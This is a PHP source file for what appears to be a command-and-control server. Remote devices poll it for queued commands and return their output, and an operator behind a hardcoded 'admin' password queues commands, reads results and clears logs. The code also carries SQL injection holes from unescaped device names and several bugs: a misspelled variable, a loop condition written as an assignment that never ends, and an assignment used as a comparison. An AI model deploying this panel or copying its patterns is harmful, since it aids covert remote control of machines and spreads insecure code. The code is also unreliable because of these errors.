<?php

define("ACCESS_PASSWORD", "admin");

class RequestAnalyzer
{
	private $db;

	function __construct()
	{
		$this->db = new SQLite3("main.db");
	}

    function addLoggings($connectedUser)
    {
        $this->getDatabase()->query("INSERT INTO log (deviceName, date) values ('".$connectedUser."', '".time()."')");
    }

	function addCommand($userId, $command)
	{
       $this->getDatabase()->query("INSERT INTO command (deviceName, command) values ('".$userId."', '".$this->getDatabase()->escapeString($command)."')");
	}
	
	function addCommandResults($connectedUser, $results)
    {
        $this->getDatabase()->query("INSERT INTO commandResults (deviceName, result) values ('".$connectedUser."', '".$this->getDatabase()->escapeString($results)."')");
    }
	
	function clearLogs()
	{
		$this->getDatabase()->query("DELETE FROM log");
	}
	
	function clearCommands()
	{
		$this->getDatabase()->query("DELETE FROM command");
	}
	
	function clearResults()
	{
		$this->getDatabase()->query("DELETE FROM commandResults");
	}
	    
    function checkTables()
    {
        $this->getDatabase()->query("CREATE TABLE IF NOT EXISTS `log` (`deviceName` text not null, `date` text not null)");
        $this->getDatabase()->query("CREATE TABLE IF NOT EXISTS `command` (`deviceName` text not null, `command` text not null)");
        $this->getDatabase()->query("CREATE TABLE IF NOT EXISTS `commandResults` (`deviceName` text not null, `result` text not null)");
    }

	function getDatabase()
	{
		return $this->db;
	}

    function getAllCommands()
    {
        return $this->getDatabase()->query("SELECT * FROM command");
    }
    
    function getCommandResults()
    {
        return $this->getDatabase()->query("SELECT * FROM commandResults");
    }
    
    function getCommands($deviceName)
    {
        $statement = $this->getDatabase()->query("SELECT * FROM command WHERE deviceName = '$deviceName'");
        $output = [];

        while($result = $statement->fetchArray())
        {
            $output[] = $result['command'];
        }

        return $output;
    }
    
    function getLogs()
    {
        return $this->getDatabase()->query("SELECT * FROM log");
    }
    
    function removeUsedCommands($deviceName)
    {
        $this->getDatabase()->query("DELETE FROM command WHERE deviceName = '$deviceName'");
	}
}

class Tools
{
	public static function directOutput(array $array = [], $ouputSpace = 0)
	{	
		$count = 0;
		$nextOutput = $outputSpace + 1;
		
		foreach ($array as $key => $value)
		{
			if ($count > 0 || $outputSpace > 0)
				echo "\n";
			
			for ($addSpace = 0; $addSpace = $outputSpace; $addSpace++)
				echo " 	 ";
			
			echo "$key  => ";

			echo (is_array($value)) ? self::directOutput($value, $nextOutput) : $value; 
			
			$count++;
		}
	}
	
	public static function keyValue(&$array, &$statement)
	{
		$count = 0;
						
        while($result = $statement->fetchArray())
		{
			$array[$count++.":".$result[0]] = $result[1];
		}
	}
}

$analyzer = new RequestAnalyzer();
$analyzer->checkTables();

if (isset($_GET['deviceName']))
{
    $deviceName = htmlspecialchars($_GET['deviceName']);
    
    if (isset($_POST['command']) && isset($_GET['accessPassword']) && $_GET['accessPassword'] == ACCESS_PASSWORD)
    {
		if (isset($_GET['server']))
		{
			$received = json_decode($_POST['command'], true);
			$response = [];
			$result = false;
			
			if ($received != false && isset($received['request']))
				switch ($received['request'])
				{
					case "clearLogs":
						$analyzer->clearLogs();
						$result = true;
						break;
					case "clearCommands":
						$analyzer->clearCommands();
						$result = true;
						break;
					case "clearResults":
						$analyzer->clearResults();
						$result = true;
						break;
					case "commands":
						$statement = $analyzer->getAllCommands();
						
						Tools::keyValue($response, $statement);

						$result = true;
						break;
					case "logs":
						$statement = $analyzer->getLogs();
							
						Tools::keyValue($response, $statement);
	
						$result = true;
						break;
					case "results":
						$statement = $analyzer->getCommandResults();
						
						Tools::keyValue($response, $statement);

						$result = true;
						break;
					default:
						$response['error'] = "Command $received[request] is not found";
						break;
				}
			
			if ($result == true && count($response) == 0 || $result = false)
				$response['result'] = ($result) ? "true.noOutput" : "false";
			
			if (isset($_GET['jsonOutput']))
				echo json_encode($response);
			else
				Tools::directOutput($response, 0);
		}
		else
		{
			$analyzer->addCommand($deviceName, $_POST['command']);
			echo '{"deviceName":"'.$deviceName.'", "result":"true"}';
		}
	}
	else
	{
		$analyzer->addLoggings($deviceName);

		if (isset($_POST['result']) && strlen($_POST['result']) > 2)
		{
			$array = json_decode($_POST['result'], true);
			
			if (count($array) > 0)
				foreach($array as $value)
					$analyzer->addCommandResults($deviceName, $value);
		}

		echo json_encode($analyzer->getCommands($deviceName));
    
		$analyzer->removeUsedCommands($deviceName);
	}
}
